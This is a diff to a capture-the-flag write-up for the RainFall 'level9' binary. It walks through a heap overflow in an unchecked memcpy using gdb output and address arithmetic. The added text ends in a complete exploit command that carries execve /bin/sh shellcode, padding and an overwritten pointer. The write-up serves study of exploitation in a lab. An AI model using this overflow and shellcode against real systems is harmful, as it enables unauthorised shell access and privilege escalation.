@@ -18,7 +18,7 @@ memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 109) = 0x0804a00c
 --- SIGSEGV (Segmentation fault) ---
 +++ killed by SIGSEGV +++
 
-The `memcpy` function is called in the `setAnnotation`. Because it uses the length of the string with `strlen`, but there is no control of the size, we can overflow and cause changes to the heap.
+The `memcpy` function is called in the `setAnnotation`. Because it uses the length of the string with `strlen`, but there is no control of the size, so we can overflow and cause changes to the heap.
 
 Let's start the program while putting a breakpoint to `setAnnotation` function : 
 
@@ -74,7 +74,47 @@ Let's start the program while putting a breakpoint to `setAnnotation` function :
 > (gdb) br *0x08048677   
 > Breakpoint 1 at 0x8048677
 
-[...]
+Before we run the program we put an argument to create the overflow
+
+> (gdb) set args $(python -c 'print("A"*128)')
+
+> (gdb) r
+
+> Starting program: /home/user/level9/level9 $(python -c 'print("A"*128)')    
+> Breakpoint 1, 0x08048677 in main ()    
+
+> (gdb) i r    
+eax            0x804a008	134520840    
+ecx            0x20f21	134945    
+edx            0x6	6    
+ebx            0x804a078	134520952    
+esp            0xbffff690	0xbffff690    
+ebp            0xbffff6b8	0xbffff6b8    
+esi            0x0	0    
+edi            0x0	0    
+eip            0x8048677	0x8048677 <main+131>    
+eflags         0x200282	[ SF IF ID ]    
+cs             0x73	115    
+ss             0x7b	123    
+ds             0x7b	123    
+es             0x7b	123    
+fs             0x0	0    
+gs             0x33	51    
+
+We have the address of the `eax` that we could write on, but this doesn't work much. Because of the length of the address, we nedd to add 4 bytes.
+
+```
+level9@RainFall:~$ python
+Python 2.7.3 (default, Jun 22 2015, 19:43:34) 
+[GCC 4.6.3] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> int('0x804a008', 16) + 4
+134520844
+>>> hex(134520844)
+'0x804a00c'
+```
+
+We to overflow this address to inject a shellcode that can open a shell (payload : shellcode + A * (109 - 53) + address): 
 
 > level9@RainFall:~$ ./level9 `perl -e 'print "\x10\xa0\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80","A"x56,"\x0c\xa0\x04\x08"'`    
 
